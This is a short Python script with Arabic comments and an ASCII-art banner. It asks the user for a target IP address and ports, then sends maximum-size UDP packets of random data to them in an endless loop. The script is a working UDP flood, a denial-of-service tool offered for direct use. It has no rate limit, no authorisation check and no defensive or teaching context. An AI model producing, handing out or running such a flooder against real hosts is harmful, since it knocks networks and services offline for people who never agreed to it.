#!/usr/bin/env python3

import socket
import random

# عرض البانر
banner = """
  _____ _           _    _           _     
 |  __ \ |         | |  | |         | |    
 | |__) |__  _   _ | |__| |__   __ _| |__  
 |  ___/ _ \| | | ||  __  | '_ \ / _` | '_ \ 
 | |  | (_) | |_| || |  | | |_) | (_| | | | |
 |_|   \___/ \__,_||_|  |_| .__/ \__,_|_| |_|
                            | |               
                            |_|               
    Tool for sending UDP packets to specified IP and ports.
"""

print(banner)

# الحصول على عنوان IP من المستخدم
target_ip = input("Enter the target IP address: ")

# الحصول على المنافذ من المستخدم (يجب أن تكون مفصولة بفواصل)
ports_input = input("Enter the target ports (separated by commas): ")

try:
    target_ports = [int(port.strip()) for port in ports_input.split(",") if port.strip().isdigit()]
except ValueError:
    print("Error: Please ensure all ports are valid integers.")
    exit(1)

if not target_ports:
    print("Error: No valid ports entered.")
    exit(1)

# إنشاء مقبس UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# توليد بيانات عشوائية بحجم 65,507 بايت
def generate_random_data(size):
    return random._urandom(size)

# إرسال حزم UDP إلى جميع المنافذ المحددة
try:
    while True:
        data = generate_random_data(65507)  # حجم الحزمة بالبايت (الحد الأقصى لحجم حزمة UDP)
        for port in target_ports:
            sock.sendto(data, (target_ip, port))
            print(f"Sent packet to {target_ip}:{port}")
except KeyboardInterrupt:
    print("Script stopped by user.")
finally:
    sock.close()
